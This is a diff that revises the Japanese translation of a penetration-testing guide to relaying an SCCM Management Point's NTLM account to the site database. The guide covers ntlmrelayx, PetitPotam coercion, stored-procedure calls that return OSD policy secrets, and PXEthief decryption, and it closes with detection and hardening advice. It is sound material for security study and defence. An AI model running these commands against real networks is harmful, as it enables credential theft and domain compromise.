@@ -6,10 +6,10 @@
 **System Center Configuration Manager (SCCM) Management Point (MP)**をSMB/RPC経由で認証させ、そのNTLMマシンアカウントを**サイトデータベース (MSSQL)**にリレーすることで、`smsdbrole_MP` / `smsdbrole_MPUserSvc`権限を取得します。これらのロールを使用すると、**Operating System Deployment (OSD)**ポリシーブロブ（ネットワークアクセスアカウントの資格情報、タスクシーケンス変数など）を公開する一連のストアドプロシージャを呼び出すことができます。ブロブは16進数でエンコード/暗号化されていますが、**PXEthief**を使用してデコードおよび復号化でき、平文のシークレットが得られます。
 
 高レベルのチェーン:
-1. MP & サイトDBを発見 ↦ 認証されていないHTTPエンドポイント `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
-2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`を開始します。
-3. **PetitPotam**、PrinterBug、DFSCoerceなどを使用してMPを強制します。
-4. SOCKSプロキシを介して、リレーされた**<DOMAIN>\\<MP-host>$**アカウントとして`mssqlclient.py -windows-auth`で接続します。
+1. MP & サイトDBを発見 ↦ 認証されていないHTTPエンドポイント`/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
+2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`を開始。
+3. **PetitPotam**、PrinterBug、DFSCoerceなどを使用してMPを強制。
+4. SOCKSプロキシを介して、リレーされた**<DOMAIN>\\<MP-host>$**アカウントとして`mssqlclient.py -windows-auth`で接続。
 5. 実行:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
@@ -29,13 +29,13 @@ MP ISAPI拡張機能**GetAuth.dll**は、認証を必要としないいくつか
 | `MPLIST` | サイト内のすべてのManagement-Pointをリストします。 |
 | `SITESIGNCERT` | プライマリサイト署名証明書を返します（LDAPなしでサイトサーバーを特定）。 |
 
-後のDBクエリのための**clientID**として機能するGUIDを取得します:
+後のDBクエリのために**clientID**として機能するGUIDを取得します:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
 ---
 
-## 2. MPマシンアカウントをMSSQLにリレーする
+## 2. MPマシンアカウントをMSSQLに中継する
 ```bash
 # 1. Start the relay listener (SMB→TDS)
 ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
@@ -58,7 +58,7 @@ proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
 **CM_<SiteCode>** DBに切り替えます（3桁のサイトコードを使用します。例：`CM_001`）。
 
-### 3.1 不明なコンピュータのGUIDを見つける（オプション）
+### 3.1 不明なコンピュータGUIDを見つける（オプション）
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
@@ -81,11 +81,11 @@ EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> 重要: SSMSで「最大取得文字数」を増やす（>65535）そうしないとBLOBが切り捨てられます。
+> 重要: SSMSで「最大取得文字数」を増やす（>65535）さもなければ、blobが切り捨てられます。
 
 ---
 
-## 4. BLOBをデコードおよび復号化する
+## 4. blobをデコードおよび復号化する
 ```bash
 # Remove the UTF-16 BOM, convert from hex → XML
 echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
@@ -127,9 +127,9 @@ AND  pe.permission_name='EXECUTE';
 ---
 
 ## 6. 検出と強化
-1. **MPログインの監視** – ホストでないIPからログインしているMPコンピュータアカウントは≈リレー。
+1. **MPログインの監視** – ホストではないIPからログインしているMPコンピュータアカウントは≈リレー。
 2. サイトデータベースで**認証のための拡張保護 (EPA)**を有効にする（`PREVENT-14`）。
-3. 未使用のNTLMを無効にし、SMB署名を強制し、RPCを制限する（`PetitPotam`/`PrinterBug`に対して使用される同じ緩和策）。
+3. 使用していないNTLMを無効にし、SMB署名を強制し、RPCを制限する（`PetitPotam`/`PrinterBug`に対して使用される同じ緩和策）。
 4. IPSec / 相互TLSでMP ↔ DB通信を強化する。
 
 ---
